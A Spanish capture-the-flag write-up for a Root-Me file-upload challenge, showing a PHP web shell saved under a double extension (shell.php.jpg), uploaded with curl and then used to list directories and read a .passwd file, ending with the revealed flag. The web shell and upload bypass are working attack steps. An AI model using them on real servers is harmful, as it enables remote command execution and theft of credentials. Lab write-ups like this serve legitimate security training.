# file_upload_with_doubleextension

## 🎯 Objetivo
[Escribe el objetivo aquí]
El objetivo es vulnerar la app o con una subida de archivos
ya que nos permite subir imagenes
## 🔍 Metodología
### 0. Identificación
primero subimos a la app una imagen normal para analisr la salida que nos da

### 1. Explotación
primero creamos una web shell con php:
```bash 
	echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```
con eso en mente haora subimos el codigo 
``` bash
curl -F "file=@shell.php.jpg" -F "submit=upload" "http://challenge01.root-me.org/web-serveur/ch20/?action=upload"
```
eso nos da la siguientr salida confirmando la subida 
```HTML
<html><body><h1>Photo gallery v 0.02</h1><span id="menu"/>&nbsp;|&nbsp;<span><a href='?galerie=emotes'>emotes</a></span>&nbsp;|&nbsp;<span><a href='?galerie=apps'><b>apps</b></a></span>&nbsp;|&nbsp;<span><a href='?galerie=upload'>upload</a></span>&nbsp;|&nbsp;<span><a href='?galerie=devices'>devices</a></span>&nbsp;|&nbsp;<span><a href='?galerie=categories'>categories</a></span>&nbsp;|&nbsp;<span><a href='?galerie=actions'>actions</a></span><br><hr>File information&nbsp;:<br><ul><li>Upload: shell.php.jpg</li><li>Type: image/jpeg</li><li>Size: 0.0302734375 kB</li><li>Stored in: <a href='./galerie/upload/6794241cee96a1a70c0a2bb391fee52c/shell.php.jpg'>./galerie/upload/6794241cee96a1a70c0a2bb391fee52c/shell.php.jpg</a></li></ul><p style='color: green'>File uploaded</p></bo
```

procedemos a probar y revisar los aechivos en el servidor 
```bash 
curl http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/6794241cee96a1a70c0a2bb391fee52c/shell.php.jpg?cmd=ls%20-la%20../../../
total 64
drwxr-s---  4 web-serveur-ch20 www-data   4096 Aug  4  2022 .
drwxr-s--x 99 challenge        www-data   4096 Mar 21  2025 ..
-r-x------  1 root             root        723 Aug  4  2022 ._init
-r--------  1 challenge        challenge   274 Dec 10  2021 ._nginx.http-level.inc
-r--------  1 challenge        challenge   904 Dec 10  2021 ._nginx.server-level.inc
-r--------  1 root             www-data  12306 Dec 18  2021 ._perms
-r--------  1 challenge        challenge   645 Dec 10  2021 ._php-fpm.pool.inc
-rw-r-----  1 root             www-data     44 Dec 10  2021 .git
-rw-r-----  1 root             www-data    181 Dec 12  2021 .gitignore
-r--------  1 web-serveur-ch20 www-data     26 Dec 10  2021 .passwd
drwxr-s---  8 web-serveur-ch20 www-data   4096 Dec 12  2021 galerie
-r--r-----  1 web-serveur-ch20 www-data   3974 Dec 10  2021 index.php
drwxrwsrwx  2 web-serveur-ch20 www-data   4096 Dec 20 15:17 tmp```

gracias a esto vemos un archivo oculto con permiso de lectura .passwd
procedemos  leerlo con cat y sacar la flag del reto
```bash
$ curl "http://challenge01.root-me.org/web-serveur/ch20/galerie/upload/6794241cee96a1a70c0a2bb391fee52c/shell.php.jpg?cmd=cat%20../../../.passwd"
Gg9LRz-hWSxqqUKd77-_q-6G8```
## 🚩 Flag
```text
Gg9LRz-hWSxqqUKd77-_q-6G8```


